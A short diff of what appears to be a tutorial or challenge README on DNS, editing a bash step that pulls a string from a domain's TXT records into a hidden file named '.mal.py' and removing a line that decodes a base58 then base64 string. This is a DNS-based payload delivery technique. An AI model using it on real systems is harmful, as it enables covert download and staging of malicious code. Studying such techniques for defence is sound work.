@@ -55,7 +55,6 @@ Check this [article](https://en.wikipedia.org/wiki/Domain_Name_System)
 - decode from base 58 and decode the output from base64
 
 ```bash
- nslookup -type=txt badbaddoma.in |grep "ig" |cut -d \" -f2 > .mal.py
+ nslookup -type=txt SUBDOMAIN |grep "Ye" |cut -d \" -f2 > .mal.py
 
-echo "XYZSTRINGRECEIVED==" |base58 -d |base64 -d
 ```
